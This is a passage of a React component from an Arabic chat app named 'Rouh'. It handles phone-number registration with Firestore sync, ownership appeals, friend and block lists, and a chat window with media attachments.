    if (newFriend.phone.length < 9) {
      showToast('يرجى إدخال رقم هاتف صحيح لا يقل عن 9 أرقام لتسجيل الحساب', 'error');
      return;
    }

    const regName = newFriend.name;
    const regPhone = newFriend.phone.replace(/[^0-9]/g, '');

    // Transition instantly! Set userPhone to log them in right away
    setUserPhone(regPhone);
    localStorage.setItem('userPhone', regPhone);
    localStorage.setItem('userName', regName);
    setNewFriend({ name: '', phone: '', codes: [] });

    showToast('جاري تفعيل وعقد حسابك ومزامنته بالخلفية... أهلاً بك! 🎉', 'success');

    // Run heavier registering operations in the background
    addBackgroundTask('تسجيل الحساب والمزامنة بالخلفية', async () => {
      let success = false;
      let isConflict = false;
      let statusError = false;

      try {
        const urlParams = new URLSearchParams(window.location.search);
        const ref = urlParams.get('ref') || localStorage.getItem('rouh_referral_source');
        
        const res = await fetch('/api/chat/register', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            name: regName, 
            phone: regPhone,
            ref: ref,
            deviceId: getDeviceId(),
            friends: friends.map(f => ({ phone: f.phone, name: f.name, codes: f.accessCodes })),
            chats: []
          })
        });

        if (res.ok) {
          success = true;
          if (ref) {
            try {
              const { firebaseSaveReferral } = await import('./lib/firebaseSync');
              await firebaseSaveReferral(ref, regPhone);
            } catch (refe) {}
          }
        } else if (res.status === 409) {
          isConflict = true;
        } else {
          statusError = true;
        }
      } catch (e) {
        statusError = true;
      }

      // Check and write fallback direct to Firestore
      if (statusError) {
        try {
          const { isFirebasePlaceholder } = await import('./lib/firebase');
          if (!isFirebasePlaceholder) {
            const { doc, getDoc, setDoc, collection } = await import('firebase/firestore');
            const { db } = await import('./lib/firebase');
            const colRef = collection(db, 'a', 'aa', 'abcd_profiles');
            const docSnap = await getDoc(doc(colRef, regPhone));

            if (docSnap.exists()) {
              isConflict = true;
            } else {
              await setDoc(doc(colRef, regPhone), {
                usernameUnified: regName,
                phone: regPhone,
                deviceId: getDeviceId(),
                deviceModel: 'Client Browser (Background)',
                operatingSystem: 'Navigator',
                timestamp: Date.now(),
                friends: friends.map(f => ({ phone: f.phone, name: f.name, codes: f.accessCodes })),
                chats: []
              });

              // Write to public section
              const publicRef = collection(db, 'a', 'ab', 'users');
              await setDoc(doc(publicRef, regPhone), {
                username: regName,
                phone: regPhone,
                deviceId: getDeviceId(),
                timestamp: Date.now()
              });

              success = true;
            }
          }
        } catch (fireErr) {
          console.error("Direct Firestore registration failed in background:", fireErr);
        }
      }

      // Also enqueue to IndexedDB queue to ensure extreme resilience
      try {
        pushToOfflineQueue('user_profile', { 
          phone: regPhone, 
          name: regName, 
          deviceId: getDeviceId(), 
          friends: friends.map(f => ({ phone: f.phone, name: f.name, codes: f.accessCodes })),
          chats: [] 
        });
      } catch (err) {}

      if (success) {
        showToast('رائع! اكتمل تفعيل وتوثيق حسابك في السحاب بنجاح ☁️✨', 'success');
      } else if (isConflict) {
        showToast('تنبيه: هذا الرقم مسجل بالفعل باسم آخر بالسحاب؛ يرجى تقديم طلب استئناف لو كان الحساب لك.', 'error');
        setAppealForm({ name: regName, phone: regPhone, email: '', reason: 'الرقم مكرر بالسحاب والتسجيل خلفي' });
        setRegistrationMode('appeal');
        setUserPhone(null);
        localStorage.removeItem('userPhone');
      } else {
        showToast('تم حفظ حسابك محلياً بشكل آمن، وسيواصل التطبيق مزامنته بالخلفية.', 'info');
      }
    });
  };

  const handleMediaClick = async (type: 'camera' | 'gallery') => {
    const granted = await onPermissionRequest();
    if (!granted) {
      showToast('يرجى الموافقة على إذن الكاميرا والوسائط أولاً', 'info');
      return;
    }
    if (type === 'camera') cameraInputRef.current?.click();
    else fileInputRef.current?.click();
  };

  const submitAppeal = async () => {
    if (!appealForm.email) {
      showToast('يرجى إدخال بريدك الإلكتروني للتواصل', 'error');
      return;
    }

    if (typeof navigator !== 'undefined' && !navigator.onLine) {
      showToast('تم حفظ طلب الاستئناف أوفلاين بنجاح. سيتم رفعه لإدارة روح تلقائياً فور وجود إنترنت.', 'success');
      pushToOfflineQueue('complaint', {
        id: 'appeal_' + Date.now(),
        name: appealForm.name,
        phone: appealForm.phone,
        message: `طلب استئناف رقم الهاتف. وسيلة التواصل: ${appealForm.email}`,
        type: 'appeal'
      });
      setRegistrationMode('normal');
      return;
    }

    try {
      const res = await fetch('/api/chat/appeal', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...appealForm, reason: 'ملكية الرقم/تغيير الاسم' })
      });
      if (res.ok) {
        showToast('تم إرسال طلبك للإدارة. سيتم الرد عليك عبر البريد قريباً.', 'success');
        setRegistrationMode('normal');
        pushToOfflineQueue('complaint', {
          id: 'appeal_' + Date.now(),
          name: appealForm.name,
          phone: appealForm.phone,
          message: `طلب استئناف رقم الهاتف. وسيلة التواصل: ${appealForm.email}`,
          type: 'appeal'
        });
      }
    } catch (e) {
      showToast('فشل إرسال الطلب. تم حفظه محلياً وسنعاود رفعه للإدارة لاحقاً.', 'info');
      pushToOfflineQueue('complaint', {
        id: 'appeal_' + Date.now(),
        name: appealForm.name,
        phone: appealForm.phone,
        message: `طلب استئناف رقم الهاتف. وسيلة التواصل: ${appealForm.email}`,
        type: 'appeal'
      });
      setRegistrationMode('normal');
    }
  };

  if (!userPhone) {
    return (
      <div className="flex flex-col items-center justify-center min-h-0 h-full w-full max-w-md mx-auto p-4 sm:p-8 text-center overflow-y-auto custom-scrollbar">
        <div className="w-16 h-16 sm:w-20 sm:h-20 bg-blue-600/20 rounded-[2rem] flex items-center justify-center animate-pulse shrink-0 mb-4 sm:mb-6">
           <MessageSquare className="text-blue-500" size={32} />
        </div>
        
        {registrationMode === 'normal' ? (
          <>
            <div className="space-y-2 mb-4">
              <h2 className="text-lg sm:text-xl font-black text-gray-900 dark:text-white italic">دردشة روح وذكية</h2>
              <p className="text-[10px] sm:text-xs text-gray-500 dark:text-gray-400 font-bold leading-relaxed max-w-[250px] mx-auto">
                هنا يمكنك إضافة رقم هاتفك لاستقبال الدردشات من الأصدقاء بسرية تامة وتواصل ذكي.
              </p>
            </div>
            <div className="w-full max-w-xs space-y-3">
              <input 
                type="text" 
                placeholder="اسمك.." 
                className="w-full bg-gray-50 dark:bg-[#1a1c1e] border border-gray-200 dark:border-gray-800 rounded-2xl p-3 sm:p-4 text-gray-900 dark:text-white text-center font-bold text-xs sm:text-sm focus:border-blue-500 outline-none shadow-inner"
                value={newFriend.name}
                onChange={(e) => setNewFriend({...newFriend, name: e.target.value})}
              />
              <input 
                type="tel" 
                placeholder="رقم هاتفك..." 
                className="w-full bg-gray-50 dark:bg-[#1a1c1e] border border-gray-200 dark:border-gray-800 rounded-2xl p-3 sm:p-4 text-gray-900 dark:text-white text-center font-mono text-xs sm:text-sm focus:border-blue-500 outline-none shadow-inner"
                value={newFriend.phone}
                onChange={(e) => setNewFriend({...newFriend, phone: e.target.value.replace(/[^0-9]/g, '')})}
              />
              <div className="p-3 bg-red-600/10 border border-red-500/20 rounded-2xl">
                 <p className="text-[9px] text-red-600 dark:text-red-500 font-black italic leading-relaxed text-right">
                   ⚠️ تنبيه هام: يمكنك إدخال رقم هاتفك لمرة واحدة فقط. لن تتمكن من حذفه أو تعديله لاحقاً، ولن يسمح لك بإضافة رقم جديد إلا بحذف الرقم القديم من قبل الإدارة.
                 </p>
              </div>
              <button 
                onClick={handleRegister}
                className="w-full py-3.5 sm:py-4 bg-blue-600 hover:bg-blue-500 rounded-2xl text-white font-black text-xs sm:text-sm transition-all active:scale-95 shadow-lg shadow-blue-600/20"
              >
                تفعيل استقبال الرسائل
              </button>
            </div>
          </>
        ) : (
          <div className="w-full max-w-xs space-y-4 sm:space-y-6 animate-in slide-in-from-right-4 duration-500">
            <div className="space-y-2">
              <h2 className="text-base sm:text-lg font-black text-red-600 dark:text-red-500 flex items-center justify-center gap-2 italic">
                <AlertCircle size={20} /> طلب استئناف ملكية
              </h2>
              <p className="text-[10px] sm:text-xs text-gray-500 dark:text-gray-400 font-bold leading-relaxed">
                هذا الرقم مسجل مسبقاً. قدم طلبك وسيقوم المسؤول بمراجعته وتعديل الملكية بعد التحقق.
              </p>
            </div>
            <div className="space-y-3">
               <input 
                type="email" 
                placeholder="بريدك الإلكتروني للتواصل..." 
                className="w-full bg-red-100/30 dark:bg-red-900/10 border border-red-200 dark:border-red-500/20 rounded-2xl p-3 sm:p-4 text-gray-900 dark:text-white text-center text-xs font-bold outline-none focus:border-red-500"
                value={appealForm.email}
                onChange={(e) => setAppealForm({...appealForm, email: e.target.value})}
              />
              <button 
                onClick={submitAppeal}
                className="w-full py-3.5 sm:py-4 bg-red-600 hover:bg-red-500 rounded-2xl text-white font-black text-xs sm:text-sm transition-all shadow-lg shadow-red-600/20"
              >
                إرسال طلب الاستئناف
              </button>
              <button 
                onClick={() => setRegistrationMode('normal')}
                className="w-full py-2 text-gray-400 hover:text-gray-600 dark:text-gray-500 dark:hover:text-gray-300 text-[10px] font-bold italic"
              >
                العودة للتسجيل برقم آخر
              </button>
            </div>
          </div>
        )}
      </div>
    );
  }

  return (
    <div className="flex flex-col h-full overflow-hidden">
      {/* Tabs */}
      <div className="grid grid-cols-4 bg-[#121417] p-1.5 mx-2 sm:mx-4 mt-3 sm:mt-4 rounded-2xl border border-gray-800 shrink-0 gap-1">
        {[
          { id: 'friends', label: 'الأصدقاء', icon: Users },
          { id: 'inbox', label: 'الواردة', icon: CircleChevronDown },
          { id: 'sent', label: 'المرسلة', icon: CircleChevronUp },
          { id: 'blocked', label: 'المحظورون', icon: ShieldAlert },
        ].map((tab) => (
          <button
            key={tab.id}
            onClick={() => setActiveSubTab(tab.id as any)}
            className={cn(
              "flex flex-col xs:flex-row items-center justify-center gap-1 xs:gap-1.5 py-2 xs:py-3.5 rounded-xl transition-all font-black text-[9px] xs:text-[11px] select-none",
              activeSubTab === tab.id ? "bg-blue-600 text-white shadow-lg shadow-blue-600/20" : "text-gray-500 hover:text-gray-300"
            )}
          >
            <tab.icon className="size-3 xs:size-3.5" />
            <span className="truncate max-w-full">{tab.label}</span>
          </button>
        ))}
      </div>

      {/* Content */}
      <div className="flex-1 overflow-y-auto p-4 custom-scrollbar">
        {activeSubTab === 'friends' && (
          <div className="space-y-3">
            <button 
              onClick={() => setIsAddFriendOpen(true)}
              className="w-full p-6 border-2 border-dashed border-gray-800 rounded-3xl flex flex-col items-center gap-2 text-gray-500 hover:border-gray-600 hover:text-gray-400 transition-all bg-gray-800/5 group shadow-inner"
            >
              <div className="p-3 bg-gray-800 rounded-2xl group-hover:bg-gray-700 transition-colors">
                <Plus size={24} />
              </div>
              <span className="text-xs font-black italic">إضافة صديق جديد للدردشة</span>
            </button>

            {friends.filter(f => !blockedPhones.includes(f.phone)).map(friend => (
              <div 
                key={friend.id}
                onMouseDown={() => {
                  const timer = setTimeout(() => setSelectedFriend(friend), 500);
                  (window as any)[`lp_${friend.id}`] = timer;
                }}
                onMouseUp={() => clearTimeout((window as any)[`lp_${friend.id}`])}
                onTouchStart={() => {
                  const timer = setTimeout(() => setSelectedFriend(friend), 500);
                  (window as any)[`lp_${friend.id}`] = timer;
                }}
                onTouchEnd={() => clearTimeout((window as any)[`lp_${friend.id}`])}
                className="bg-[#1a1c1e] border border-gray-800 p-4 rounded-3xl flex items-center justify-between group shadow-lg active:bg-gray-800/40 transition-colors"
              >
                <div className="flex items-center gap-4">
                  <div className="relative">
                    <div className="w-12 h-12 rounded-2xl bg-blue-600/10 flex items-center justify-center text-blue-500 font-black text-lg">
                      {friend.name[0]}
                    </div>
                    {friendStatuses[friend.phone] && (
                      <div className={cn(
                        "absolute -bottom-1 -right-1 w-4 h-4 border-2 border-[#1a1c1e] rounded-full",
                        friendStatuses[friend.phone] === 'متصل الآن' ? "bg-emerald-500" :
                        friendStatuses[friend.phone] === 'لم ينضم لروح بعد' ? "bg-amber-500" : "bg-gray-600"
                      )} />
                    )}
                  </div>
                  <div>
                    <h4 className="text-sm font-black text-white flex items-center gap-2">
                       {friend.name}
                       {friend.accessCodes && friend.accessCodes.length > 0 && <Shield size={10} className="text-blue-500" />}
                    </h4>
                    <p className="text-[10px] text-gray-500 font-bold flex items-center gap-1">
                       <span className={cn(
                         friendStatuses[friend.phone] === 'متصل الآن' ? "text-emerald-400" : 
                         friendStatuses[friend.phone] === 'لم ينضم لروح بعد' ? "text-amber-400 font-black italic" : "text-gray-500"
                       )}>
                         {friendStatuses[friend.phone] || 'جاري التحقق...'}
                       </span>
                    </p>
                  </div>
                </div>
                <div className="flex items-center gap-2">
                  <button 
                    onClick={() => setFriendMenuOpen(friend)}
                    className="p-3 bg-gray-800 text-gray-400 rounded-2xl hover:bg-gray-700 hover:text-white transition-all shadow-lg active:scale-95"
                  >
                    <FolderKey size={18} />
                  </button>
                  <button 
                    onClick={() => handleSelectFriend(friend)}
                    className="p-3 bg-blue-600/10 text-blue-500 rounded-2xl hover:bg-blue-600 hover:text-white transition-all shadow-lg active:scale-95"
                  >
                    <MessageSquare size={18} />
                  </button>
                </div>
              </div>
            ))}
          </div>
        )}

        {activeSubTab === 'blocked' && (
          <div className="space-y-4">
             <div className="p-6 bg-red-900/10 border border-red-500/20 rounded-[2rem] text-center space-y-2">
                <ShieldAlert size={40} className="text-red-500 mx-auto mb-2" />
                <h3 className="text-sm font-black text-white italic">الأرقام المحظورة والمزعجة</h3>
                <p className="text-[10px] text-gray-500 font-bold leading-relaxed">
                   هنا تظهر جميع الأرقام التي قمت بحظرها. لن يتمكن أصحاب هذه الأرقام من مراسلتك أو التفاعل معك.
                </p>
             </div>

             <div className="space-y-3">
                {blockedPhones.length === 0 ? (
                  <div className="text-center py-20 opacity-20">
                     <CheckCircle2 size={60} className="mx-auto mb-4" />
                     <p className="text-xs font-black italic">لا يوجد أرقام محظورة حالياً</p>
                  </div>
                ) : (
                  blockedPhones.map(phone => {
                    const friend = friends.find(f => f.phone === phone);
                    return (
                      <div key={phone} className="bg-[#1a1c1e] border border-gray-800 p-4 rounded-3xl flex items-center justify-between">
                         <div className="flex items-center gap-3">
                           <div className="w-10 h-10 rounded-xl bg-gray-800 flex items-center justify-center text-gray-500 font-black">
                             {friend?.name?.[0] || '؟'}
                           </div>
                           <div>
                             <h4 className="text-xs font-black text-white">{friend?.name || 'مستخدم غير مضاف'}</h4>
                             <p className="text-[10px] text-gray-600 font-mono">{phone}</p>
                           </div>
                         </div>
                         <button 
                           onClick={() => handleUnblockFriend(phone)}
                           className="px-4 py-2 bg-emerald-600/10 text-emerald-500 rounded-xl text-[10px] font-black border border-emerald-500/20 hover:bg-emerald-600 hover:text-white transition-all"
                         >
                           إلغاء الحظر
                         </button>
                      </div>
                    );
                  })
                )}
             </div>
          </div>
        )}

        {(activeSubTab === 'inbox' || activeSubTab === 'sent') && (
          <div className="space-y-3">
            {messages.length === 0 ? (
              <div className="text-center py-20 opacity-30">
                <MessageSquare size={60} className="mx-auto mb-4" />
                <p className="text-xs font-black italic">لا توجد رسائل بعد</p>
              </div>
            ) : (
              // Unique conversations for inbox/sent view
              Array.from(new Set(messages.map(m => m.from === userPhone ? m.to : m.from))).map(partnerPhone => {
                const latestMsg = messages.find(m => m.from === partnerPhone || m.to === partnerPhone)!;
                const friend = friends.find(f => f.phone === partnerPhone);
                const partnerName = friend?.name || partnerPhone;
                
                return (
                  <button
                    key={partnerPhone}
                    onClick={() => {
                      if (friend) handleSelectFriend(friend);
                      else handleSelectFriend({ id: partnerPhone, name: partnerPhone, phone: partnerPhone, accessCodes: [] });
                    }}
                    className="w-full bg-[#1a1c1e] border border-gray-800 p-4 rounded-3xl flex items-center gap-4 text-right hover:border-gray-600 transition-all active:scale-[0.98] shadow-md"
                  >
                    <div className="relative">
                      <div className="w-12 h-12 rounded-2xl bg-gray-800 flex items-center justify-center text-gray-400 italic font-black text-lg shadow-inner">
                        {partnerName[0]}
                      </div>
                      {friendStatuses[partnerPhone] && (
                        <div className={cn(
                          "absolute -bottom-1 -right-1 w-3.5 h-3.5 border-2 border-[#1a1c1e] rounded-full",
                          friendStatuses[partnerPhone] === 'متصل الآن' ? "bg-emerald-500" :
                          friendStatuses[partnerPhone] === 'لم ينضم لروح بعد' ? "bg-amber-500 shadow-[0_0_8px_rgba(245,158,11,0.5)]" : "bg-gray-600"
                        )} />
                      )}
                    </div>
                    <div className="flex-1 min-w-0">
                      <div className="flex justify-between items-center mb-1">
                        <span className="text-xs font-black text-white truncate">{partnerName}</span>
                        <div className="flex flex-col items-end">
                           <span className="text-[8px] text-gray-600 font-bold">{new Date(latestMsg.timestamp).toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' })}</span>
                           <span className={cn(
                             "text-[7px] font-black italic mt-0.5",
                             friendStatuses[partnerPhone] === 'متصل الآن' ? "text-emerald-500" : 
                             friendStatuses[partnerPhone] === 'لم ينضم لروح بعد' ? "text-amber-500" : "text-gray-600"
                           )}>
                             {friendStatuses[partnerPhone]}
                           </span>
                        </div>
                      </div>
                      <p className="text-[10px] text-gray-500 truncate italic flex items-center gap-1">
                        {latestMsg.from === userPhone && (
                          <CheckCheck size={10} className={cn(latestMsg.status === 'delivered' ? "text-blue-500" : "text-gray-600")} />
                        )}
                        {latestMsg.type === 'text' ? latestMsg.text : `[${latestMsg.type === 'image' ? 'صورة' : 'فيديو'}] ${latestMsg.text || ''}`}
                      </p>
                    </div>
                  </button>
                );
              })
            )}
          </div>
        )}
      </div>

      {/* Friend Management Modal */}
      <AnimatePresence>
        {friendMenuOpen && (
          <div className="fixed inset-0 z-[140] flex items-center justify-center p-6 bg-black/90 backdrop-blur-md">
            <motion.div 
               initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.9, opacity: 0 }}
               className="bg-[#121417] border border-gray-800 rounded-[2.5rem] p-8 max-w-sm w-full shadow-2xl relative"
            >
               <h3 className="text-lg font-black text-white italic mb-1 text-center">{friendMenuOpen.name}</h3>
               <p className="text-[10px] text-gray-500 font-bold mb-6 text-center">{friendMenuOpen.phone}</p>
               
               <div className="space-y-3">
                  <button 
                    onClick={() => { setFriendMenuOpen(null); showToast('سيتم إضافة نافذة تخصيص الرموز قريباً', 'info'); }}
                    className="w-full py-4 bg-gray-800 hover:bg-gray-700 text-white rounded-2xl font-bold flex items-center justify-center gap-3 transition-colors"
                  >
                    <Edit3 size={18} /> تخصيص رموز الوصول
                  </button>
                  <button 
                    onClick={() => handleDeleteChatHistory(friendMenuOpen.phone)}
                    className="w-full py-4 bg-red-600/10 hover:bg-red-600/20 text-red-500 rounded-2xl font-bold flex items-center justify-center gap-3 transition-colors"
                  >
                    <Trash2 size={18} /> مسح سجل الدردشة
                  </button>
                  <button 
                    onClick={() => handleBlockFriend(friendMenuOpen.phone)}
                    className="w-full py-4 bg-red-600 hover:bg-red-500 text-white rounded-2xl font-black flex items-center justify-center gap-3 transition-all"
                  >
                    <ShieldAlert size={18} /> حظر الصديق
                  </button>
                  <button 
                    onClick={() => setFriendMenuOpen(null)}
                    className="w-full py-2 text-gray-500 font-bold text-xs"
                  >تراجع</button>
               </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Fullscreen Media Preview */}
      <AnimatePresence>
        {fullscreenMedia && (
          <motion.div 
            initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
            className="fixed inset-0 z-[200] bg-black/95 flex items-center justify-center p-4 backdrop-blur-xl"
            onClick={() => setFullscreenMedia(null)}
          >
            <button className="absolute top-6 right-6 p-3 bg-white/10 rounded-full text-white backdrop-blur-md">
              <X size={24} />
            </button>
            <motion.img 
              initial={{ scale: 0.9 }} animate={{ scale: 1 }}
              src={fullscreenMedia} 
              className="max-w-full max-h-[90vh] object-contain rounded-2xl shadow-2xl" 
            />
          </motion.div>
        )}
      </AnimatePresence>

      {/* Add Friend Modal */}
      <AnimatePresence>
        {isAddFriendOpen && (
          <div className="fixed inset-0 z-[120] flex items-center justify-center p-3 sm:p-6 bg-black/85 backdrop-blur-md">
            <motion.div 
               initial={{ scale: 0.9, opacity: 0 }} 
               animate={{ scale: 1, opacity: 1 }} 
               exit={{ scale: 0.9, opacity: 0 }}
               className="bg-[#1a1c1e] border border-gray-800 rounded-[2rem] sm:rounded-[2.5rem] p-5 sm:p-8 max-w-sm w-full max-h-[95vh] sm:max-h-[85vh] overflow-y-auto shadow-2xl relative custom-scrollbar"
            >
               <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-blue-600 to-purple-600" />
               <h3 className="text-base sm:text-lg font-black text-white italic mb-4 sm:mb-6 text-center">إضافة صديق جديد</h3>
               <div className="space-y-3 sm:space-y-4">
                  <div className="space-y-1 sm:space-y-2">
                    <label className="text-[9px] sm:text-[10px] text-gray-500 font-black uppercase tracking-widest px-1">اسم الصديق</label>
                    <input 
                      type="text" 
                      className="w-full bg-black/40 border border-gray-800 rounded-xl sm:rounded-2xl p-3 sm:p-4 text-white text-right font-bold text-xs sm:text-sm focus:border-blue-500 outline-none transition-all"
                      value={newFriend.name}
                      onChange={e => setNewFriend({...newFriend, name: e.target.value})}
                      placeholder="أدخل اسم الصديق..."
                    />
                  </div>
                  <div className="space-y-1 sm:space-y-2">
                    <label className="text-[9px] sm:text-[10px] text-gray-500 font-black uppercase tracking-widest px-1">رقم الهاتف</label>
                    <input 
                      type="tel" 
                      className="w-full bg-black/40 border border-gray-800 rounded-xl sm:rounded-2xl p-3 sm:p-4 text-white text-right font-mono text-xs sm:text-sm focus:border-blue-500 outline-none transition-all"
                      value={newFriend.phone}
                      onChange={e => setNewFriend({...newFriend, phone: e.target.value.replace(/[^0-9]/g, '')})}
                      placeholder="رقم الهاتف بدون مسافات..."
                    />
                  </div>
                  <div className="space-y-1 sm:space-y-2">
                    <div className="flex justify-between items-center px-1">
                      <label className="text-[9px] sm:text-[10px] text-gray-500 font-black uppercase tracking-widest">رمز الوصول السريع</label>
                      <button 
                        onClick={() => setNewFriend({...newFriend, codes: []})}
                        className="text-[8px] sm:text-[9px] text-rose-500 font-black uppercase"
                      >مسح الكل</button>
                    </div>
                    <p className="text-[8px] sm:text-[9px] text-gray-600 italic px-1">اختر أرقاماً للوصول عبر الحاسبة ({newFriend.codes.length}/6)</p>
                    <div className="grid grid-cols-5 gap-1 sm:gap-1.5 p-2 sm:p-3 bg-black/40 rounded-xl sm:rounded-2xl border border-gray-800">
                      {[1, 2, 3, 4, 5, 6, 7, 8, 9, 0].map(num => (
                        <button
                          key={num}
                          onClick={() => {
                            if (newFriend.codes.length < 6) {
                              setNewFriend({...newFriend, codes: [...newFriend.codes, num.toString()]});
                            }
                          }}
                          className={cn(
                            "h-8 sm:h-10 rounded-lg flex items-center justify-center font-mono font-bold text-xs sm:text-sm transition-all active:scale-95",
                            newFriend.codes.includes(num.toString()) ? "bg-blue-600 text-white shadow-lg shadow-blue-600/30" : "bg-gray-800 text-gray-400 hover:bg-gray-700 hover:text-white"
                          )}
                        >
                          {num}
                        </button>
                      ))}
                    </div>
                  </div>
                  <div className="flex gap-2 sm:gap-3 pt-2 sm:pt-4">
                    <button 
                      onClick={handleAddFriend}
                      className="flex-1 py-3 sm:py-4 bg-blue-600 hover:bg-blue-500 rounded-xl sm:rounded-2xl text-white font-black text-xs sm:text-sm transition-all active:scale-95 shadow-lg shadow-blue-600/30"
                    >إضافة</button>
                    <button 
                      onClick={() => setIsAddFriendOpen(false)}
                      className="flex-1 py-3 sm:py-4 bg-gray-800 hover:bg-gray-700 rounded-xl sm:rounded-2xl text-gray-400 font-black text-xs sm:text-sm transition-all active:scale-95"
                    >إلغاء</button>
                  </div>
               </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Chat Window Modal */}
      <AnimatePresence>
        {selectedFriend && (
          <motion.div 
            initial={{ x: '100dvw' }} animate={{ x: 0 }} exit={{ x: '100dvw' }}
            transition={{ type: 'spring', damping: 28, stiffness: 220 }}
            className="fixed inset-y-0 right-0 left-0 md:left-1/2 md:right-auto md:-translate-x-1/2 w-full max-w-lg z-[130] bg-[#0c0d0f] flex flex-col h-[100dvh] max-h-[100dvh] shadow-2xl md:border-x md:border-gray-800 outline-none"
          >
            <header className="p-3 sm:p-4 flex items-center justify-between border-b border-gray-800 bg-[#121417] shadow-xl shrink-0">
               <button onClick={() => setSelectedFriend(null)} className="p-2 text-gray-400 hover:text-white transition-colors">
                 <ChevronRight size={24}/>
               </button>
               <div className="flex flex-col items-center">
                  <span className="text-sm font-black text-white italic truncate max-w-[180px] sm:max-w-[280px]">{selectedFriend.name}</span>
                  <span className={cn(
                    "text-[9px] font-bold uppercase tracking-widest flex items-center gap-1 mt-0.5",
                    friendStatuses[selectedFriend.phone] === 'متصل الآن' ? "text-emerald-400" : "text-gray-500"
                  )}>
                    {friendStatuses[selectedFriend.phone] === 'متصل الآن' && <div className="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-pulse" />}
                    {friendStatuses[selectedFriend.phone] === 'متصل الآن' ? 'متصل الآن' : `منذ ${friendStatuses[selectedFriend.phone] || 'وقت قصير'}`}
                  </span>
               </div>
               <div className="p-2 opacity-0"><ChevronRight size={24}/></div>
            </header>
            
            <div className="flex-1 overflow-y-auto p-4 space-y-4 custom-scrollbar bg-black/20">
               {messages.filter(m => (m.from === selectedFriend.phone && m.to === userPhone) || (m.from === userPhone && m.to === selectedFriend.phone))
                .map(msg => {
                  const isMe = msg.from === userPhone;
                  return (
                    <div key={msg.id} className={cn("flex flex-col w-full", isMe ? "items-start" : "items-end")}>
                       <div className={cn(
                         "max-w-[85%] p-3 sm:p-4 rounded-3xl shadow-lg relative overflow-hidden",
                         isMe ? "bg-blue-600 text-white rounded-tl-none" : "bg-[#1a1c1e] text-gray-200 border border-gray-800 rounded-tr-none"
                       )}>
                         {msg.type === 'image' && msg.mediaUrl && (
                           <img 
                             src={msg.mediaUrl} 
                             onClick={() => setFullscreenMedia(msg.mediaUrl!)}
                             className="rounded-xl mb-2 max-h-60 w-full object-cover cursor-pointer hover:opacity-90 transition-opacity shadow-md" 
                           />
                         )}
                         {msg.type === 'video' && msg.mediaUrl && <video src={msg.mediaUrl} controls className="rounded-xl mb-2 max-h-60 w-full shadow-md" />}
                         {msg.text && <p className="text-[11px] sm:text-xs font-bold leading-relaxed whitespace-pre-wrap break-words">{msg.text}</p>}
                         
                         <div className="flex items-center gap-1.5 mt-1.5 opacity-60">
                            <span className="text-[7px] font-bold">
                              {new Date(msg.timestamp).toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' })}
                            </span>
                            {isMe && <CheckCheck size={10} className={cn(msg.status === 'delivered' ? "text-blue-200" : "text-white/50")} />}
                         </div>
                       </div>
                    </div>
                  );
                })}
            </div>

            <div className="p-3 sm:p-4 border-t border-gray-800 bg-[#121417] space-y-3 shadow-2xl shrink-0">
               {uploadProgress !== null && (
                 <div className="relative w-full h-1 bg-gray-800 rounded-full overflow-hidden">
                    <motion.div 
                      initial={{ width: 0 }} animate={{ width: `${uploadProgress}%` }}
                      className="absolute inset-0 bg-blue-500 rounded-full" 
                    />
                 </div>
               )}
               {attachedMedia && (
                 <div className="relative w-16 h-16 sm:w-20 sm:h-20 bg-black/40 rounded-2xl overflow-hidden border-2 border-blue-500/30 group">
                    {attachedMedia.type === 'image' ? <img src={attachedMedia.data} className="w-full h-full object-cover" /> : <div className="w-full h-full flex items-center justify-center bg-blue-600/10"><FileImage className="text-blue-500" /></div>}
                    <button onClick={() => setAttachedMedia(null)} className="absolute top-1 right-1 p-1 bg-red-600 rounded-full text-white shadow-lg shadow-red-900/40"><X size={10}/></button>
                 </div>
               )}
               <div className="flex items-center gap-1.5 sm:gap-3 h-auto">
                  <div className="flex gap-1 shrink-0">
                    <input 
                      type="file" ref={fileInputRef} className="hidden" 
                      accept="image/*,video/*"
                      onChange={e => {
                        const file = e.target.files?.[0];
                        if (file) {
                          const reader = new FileReader();
                          reader.onload = (ev) => {
                            setAttachedMedia({ 
                              data: ev.target?.result as string, 
                              name: file.name, 
                              type: file.type.startsWith('image') ? 'image' : 'video' 
                            });
                          };
                          reader.readAsDataURL(file);
                        }
                      }}
                    />
                    <input 
                      type="file" ref={cameraInputRef} className="hidden" 
                      accept="image/*" capture="environment"
                      onChange={e => {
                        const file = e.target.files?.[0];
                        if (file) {
                          const reader = new FileReader();
                          reader.onload = (ev) => {
                            setAttachedMedia({ 
                              data: ev.target?.result as string, 
                              name: file.name, 
                              type: 'image'
                            });
                          };
                          reader.readAsDataURL(file);
                        }
                      }}
                    />
                    <button 
                      type="button"
                      onClick={() => {
                        onSmartTrigger('s', 'chat_media_click');
                        handleMediaClick('gallery');
                      }}
                      className="p-1.5 sm:p-2.5 md:p-3 bg-gray-800 hover:bg-gray-700 text-gray-400 rounded-lg sm:rounded-2xl transition-all shadow-lg active:scale-95 shrink-0"
                      title="إرفاق صورة أو فيديو"
                    >
                      <ImagePlus className="size-4 sm:size-5" />
                    </button>
                    <button 
                      type="button"
                      onClick={() => {
                        onSmartTrigger('s', 'chat_media_click');
                        handleMediaClick('camera');
                      }}
                      className="p-1.5 sm:p-2.5 md:p-3 bg-gray-800 hover:bg-gray-700 text-gray-400 rounded-lg sm:rounded-2xl transition-all shadow-lg active:scale-95 shrink-0"
                      title="التقاط صورة"
                    >
                      <Camera className="size-4 sm:size-5" />
                    </button>
                  </div>
                  <input 
                    type="text" 
                    placeholder="اكتب رسالتك لروح..."
                    className="flex-1 min-w-0 bg-black/40 border border-gray-800 rounded-lg sm:rounded-2xl p-2 sm:p-3.5 text-white text-right text-xs sm:text-sm font-bold focus:border-blue-500 outline-none transition-all shadow-inner"
                    value={chatInput}
                    onChange={e => setChatInput(e.target.value)}
